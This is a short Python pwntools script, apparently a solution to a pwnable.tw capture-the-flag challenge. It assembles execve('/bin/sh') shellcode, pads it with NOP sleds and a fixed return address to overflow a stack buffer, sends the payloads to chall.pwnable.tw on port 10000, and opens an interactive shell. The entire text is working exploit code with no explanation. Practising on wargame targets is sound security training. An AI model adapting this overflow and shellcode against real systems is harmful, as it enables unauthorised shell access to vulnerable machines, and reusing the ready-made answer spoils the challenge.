from pwn import *


#/bin/sh
#2F 62 69 6E 2F 73 68 00

a = asm("""
        xor ecx, ecx
        xor edx, edx
        xor esi, esi
        push 0x0068732F
        push 0x6E69622F
        mov ebx, esp
        mov al, 0xb
        int 0x80
        """)

_start_again = b'\x90'*20+p32(0x8048060)
payload = _start_again+a
payload2 = b'\x90'*20+p32(0x8048066)

r = remote('chall.pwnable.tw',10000)
r.sendafter('CTF:',payload)
r.sendafter('CTF:',payload2)
r.sendafter('CTF:','\n')
r.interactive()
